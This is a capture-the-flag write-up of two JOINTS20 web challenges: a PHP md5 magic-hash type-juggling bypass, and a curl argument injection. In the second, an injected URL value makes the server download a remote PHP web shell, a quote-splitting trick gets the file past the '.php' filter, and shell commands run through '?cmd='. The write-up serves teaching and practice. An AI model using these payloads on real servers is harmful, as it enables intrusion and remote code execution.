# Joints CTF: Writeup

JOINTS20 Writeup (WEB)

This is my writeup on JOINTS20, I could not play it on time so I play the game after it's over

### ezStringMatching

from the start, there is nothing suspicious in the web, so I tried to check the network tab on my browser and see this in the header or you can just simply use curl --head CTF.joints.id:40002 to see the header of the request:

```
HTTP/1.1 200 OK
Host: ctf.joints.id:40002
Date: Mon, 04 May 2020 05:25:04 GMT
Connection: close
X-Powered-By: PHP/7.2.30
Debug: ?debug=v
Content-type: text/html; charset=UTF-8
```

there is debug option on the request, so let's try to identify ctf.joints.id:40002/?debug

```php
<?
if (!empty($_POST["string1"]) || !empty($_POST["string2"])) {
  $xxx = $_POST["string1"];
  $yyy = $_POST["string2"];
  if ($xxx === $yyy) {
    echo "<center> <p>Match bosqquee!!</p> </center>";
  } else {
    if (md5($xxx) == md5($yyy)) {
      echo "<center> $flag </center>";
    } else {
      echo "<center> <p>Not Match bosqquee!!</p> </center>";
    }
  }
}
```

We can see on the source code, we have to match `md5($xxx) == md5($yyy)` how we can do that?

Remember that PHP has type juggling because of the loose comparison (using `==` instead of `===`), you can see here for the cheat sheet.

When using `==` or loosely comparison, the comparison between the operand just see if the value has the same value on the other hand if we use the strict comparison (using `===`) it not only compares the value but also the type.

TL;DR: we can abuse the == operation, how?

The md5() operation calculates the hash of the value, if the hash computed starts with "0e" (or "0..0e") only followed by numbers, PHP will treat the hash as a float.\
\
The hash value of 240610708 is 0e462097431906509019562988736854 and the hash value of QNKCDZO is 0e830400451993494058024219903391 AND THE PHP WILL TREAT THE COMPUTED HASH THAT STARTS WITH 0e AS A FLOAT, DAMN.



![](<../.gitbook/assets/image (5).png>)

> JOINTS20{b4bytyp3ju99lin9_md5_}

### Twitter Collection

this page provides a URL box that we can feel with a link and scrap the image if it succeeds it will send alert:

![](<../.gitbook/assets/image (8).png>)

and it pops up at the bottom of the page, and it stored on the cookie I think? when I flush the cookie, the image disappears, poor waifu.

and the important thing that is the image is downloaded locally to the server, mine is here `http://ctf.joints.id:10001/downloads/9eed2d697fb5a3fa35e8d1832471a6a8464d49fe/099a95c45237eaa2243500bf145da79534ec8460.jpg` so can we just upload any file?

I try to use some kind of special character in the URL i tried there is two response one is and one is (using `"` and `-`) and bingo, there is 500 internal error:

![](<../.gitbook/assets/image (4).png>)

and the preview of the error said that

`curl:(22)TherequestedURLreturnederror:404`

we can assume the download process is using curl for you who don't know that is curl you can always check it with man curl or curl --help. The command will be something like this curl .

this is what I'm trying:

* normal query: `https://pbs.twimg.com/media/EV2FFNpUYAAFSxk?format=jpg` → success uploaded
* using another link (contains my RCE script) `https://gist.githubusercontent.com/natkingchloe/be32d35e3e28bae77660267fb43de5bb/raw/f28431b71f501a9c75a529a3ff7c09964ca1b95e/rce.php` → error, PHP file detected
* using another link (contains my RCE script, but change the extension) `https://gist.githubusercontent.com/natkingchloe/be32d35e3e28bae77660267fb43de5bb/raw/f28431b71f501a9c75a529a3ff7c09964ca1b95e/rce` → error, the URL must be from pixiv?

when I'm trying curl, we can use curl to download multiple files, for example:

```
curl "https://pbs.twimg.com/media/EV2FFNpUYAAFSxk?format=jpg" -o name_of_file_a.jpg "https://pbs.twimg.com/media/EV2FFNpUYAAFSxk?format=jpg" -o name_of_file_b.jpg
```

* trying to upload multiple files the one being from pixiv `https://pbs.twimg.com/media/EV2FFNpUYAAFSxk?format=jpg -o a https://gist.githubusercontent.com/natkingchloe/be32d35e3e28bae77660267fb43de5bb/raw/f28431b71f501a9c75a529a3ff7c09964ca1b95e/rce -o b` → error, https error?
* until this time I'm trying with different payload and I unexpectedly found the correct payload, this is the payload I used: `https://pbs.twimg.com/media/EV2FFNpUYAAFSxk?format=jpg" "https://gist.githubusercontent.com/natkingchloe/be32d35e3e28bae77660267fb43de5bb/raw/f28431b71f501a9c75a529a3ff7c09964ca1b95e/rce" -o "rce.ph""p` → success, uploaded RCE

Note:

* Bypassing the PHP filter using concatenate feature in bash

```shell
~
❯ echo "rce.php"
rce.php

~
❯ echo "rce.ph""p"
rce.php
```

* `-o` means output to a file and the argument after that is the file name with the extension

and viola:



![](<../.gitbook/assets/image (6).png>)

```shell

❯ curl "http://ctf.joints.id:10001/downloads/3e0766a83b992daee763e4c629190a1a434de474/rce.php"
<br />
<b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/www/downloads/3e0766a83b992daee763e4c629190a1a434de474/rce.php</b> on line <b>2</b><br />


❯ curl "http://ctf.joints.id:10001/downloads/3e0766a83b992daee763e4c629190a1a434de474/rce.php?cmd=ls"
cfe8e2872fe2d82029e367879c9f782bee55da0d.jpg
d0b581aff1128cbcb5fb53a9025c7d3f09315abf.jpg
d9d65b15c6f896fb5211124cea5e923f06bd1caa.jpg
dfc6c84d54c615dc3a547503e3fd616c82c2adb8.jpg
ec.xx
rce.php


❯ curl "http://ctf.joints.id:10001/downloads/3e0766a83b992daee763e4c629190a1a434de474/rce.php?cmd=ls ../.."
apakah_ini_benderanya
collect.php
downloads
favicon.ico
get.php
index.php
license-free.txt
scripts
session.php
styles
styles


❯ curl "http://ctf.joints.id:10001/downloads/3e0766a83b992daee763e4c629190a1a434de474/rce.php?cmd=cat ../../apakah_ini_benderanya"

JOINTS20{ya_benar_ini_benderanya_uwu}JOINTS20{ya_benar_ini_benderanya_uwu}

```

![](<../.gitbook/assets/image (7).png>)
